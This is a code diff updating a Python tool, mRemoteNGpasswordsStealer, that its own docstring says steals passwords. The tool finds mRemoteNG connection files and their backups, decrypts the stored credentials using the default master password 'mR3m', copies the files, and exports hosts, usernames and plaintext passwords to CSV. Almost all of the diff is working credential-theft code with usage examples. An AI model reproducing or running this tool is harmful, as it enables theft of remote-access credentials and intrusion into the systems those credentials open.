@@ -24,8 +24,8 @@ This module steals mRemoteNG passwords.
 
 >>> from mRemoteNGpasswordsStealer import Stealer
 >>> stealer = Stealer()
->>> stealer = Stealer("mR3m", r"C:\\Users\\Marine\\AppData\\Roaming\\mRemoteNG\\confCons.xml.20160622-0935582042.backup")
->>> for host, user, password in stealer.parser():
+>>> stealer = Stealer("mRemoteNG_passwords", "mR3m", r"C:\\Users\\Marine\\AppData\\Roaming\\mRemoteNG\\confCons.xml.20160622-*.backup", True)
+>>> for host, user, password in stealer.parse_all():
 ...     print(host, user, password)
 ...
 hostname username password
@@ -37,11 +37,10 @@ hostname username
 >>>
 
 ~# python mRemoteNGpasswordsStealer.py
-~# python mRemoteNGpasswordsStealer.py -f C:\\Users\\Marine\\AppData\\Roaming\\mRemoteNG\\confCons.xml.20160622-0935582042.backup
-~# python mRemoteNGpasswordsStealer.py -p mR3m
+~# python mRemoteNGpasswordsStealer.py -c -p mR3m -f C:\\Users\\Marine\\AppData\\Roaming\\mRemoteNG\\confCons.xml.20160622-*.backup
 """
 
-__version__ = "1.0.0"
+__version__ = "1.0.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -68,17 +67,19 @@ from PythonToolsKit.PrintF import printf
 from Crypto.Util.Padding import unpad
 from hashlib import pbkdf2_hmac, md5
 from collections.abc import Iterator
+from os.path import join, basename
 from xml.dom.minidom import parse
 from Crypto.Cipher import AES
 from base64 import b64decode
+from shutil import copyfile
 from getpass import getuser
 from time import strftime
 from platform import node
 from typing import Tuple
-from os.path import join
 from csv import writer
 from io import BytesIO
 from os import environ
+from glob import glob
 from sys import exit
 
 
@@ -93,16 +94,18 @@ class Stealer:
         export_filename: str = "mRemoteNG_passwords",
         password: str = "mR3m",
         configuration_file: str = None,
+        copyfiles: bool = False,
     ):
         self.time = strftime("%Y_%m_%d_%H_%M_%S")
         self.computer_name = node()
         self.user_name = getuser()
+        self.copyfiles = copyfiles
 
         export_filename = self.export_filename = self.get_filename(
             export_filename, "csv"
         )
         export_file = self.export_file = open(export_filename, "w", newline="")
-        self.path = configuration_file or self.get_configuration_file()
+        self.files = self.get_configuration_files(configuration_file)
         self.export_csv = writer(export_file)
         self.password = password.encode()
 
@@ -174,13 +177,23 @@ class Stealer:
         password = b64decode(password.encode())
         return self._decrypt(password)
 
-    def parser(self) -> Iterator[Tuple[str, str, str]]:
+    def parse_all(self) -> Iterator[Tuple[str, str, str]]:
+
+        """
+        This function parses the mRemoteNG configuration files.
+        """
+
+        parser = self.parser
+        for file in self.files:
+            yield from parser(file)
+
+    def parser(self, filename: str) -> Iterator[Tuple[str, str, str]]:
 
         """
         This function parses the mRemoteNG configuration file.
         """
 
-        event = parse(self.path).firstChild
+        event = parse(filename).firstChild
 
         if event.nodeName != "mrng:Connections":
             raise ValueError("Configuration file is not valid.")
@@ -231,17 +244,28 @@ class Stealer:
             writerow((hostname, username, password))
             yield hostname, username, password
 
-    def get_configuration_file(self) -> str:
+    def get_configuration_files(self, filename: str) -> str:
 
         """
         This function returns the default mRemoteNG configuration file.
         """
 
-        return join(
-            environ["APPDATA"],
-            "mRemoteNG",
-            "confCons.xml",
+        files = glob(
+            filename
+            or join(
+                environ["APPDATA"],
+                "mRemoteNG",
+                "confCons.xml*",
+            )
         )
+
+        if self.copyfiles:
+            get_filename = self.get_filename
+            for file in files:
+                name, _, extension = basename(file).rpartition(".")
+                copyfile(file, get_filename(name, extension))
+
+        return files
 
 
 def parse_args() -> Namespace:
@@ -259,6 +283,14 @@ def parse_args() -> Namespace:
         "-p", "--password", default="mR3m", help="mRemoteNG master password."
     )
     add_argument("-f", "--file", help="mRemoteNG configuration file.")
+    add_argument(
+        "-c",
+        "--copy",
+        "--copy-config",
+        help="Copy mRemoteNG configuration file.",
+        action="store_true",
+        default=False,
+    )
     add_argument(
         "-e",
         "--export",
@@ -281,11 +313,13 @@ def main() -> int:
 
     printf("Arguments are parsed.", "INFO")
 
-    stealer = Stealer(arguments.export, arguments.password, arguments.file)
+    stealer = Stealer(
+        arguments.export, arguments.password, arguments.file, arguments.copy
+    )
     printf("Passwords stealer is built. Start parsing...", "INFO")
 
     try:
-        for host, user, password in stealer.parser():
+        for host, user, password in stealer.parse_all():
             printf(
                 f"Host: {host!r}, Username: {user!r}, Password: {password!r}"
             )
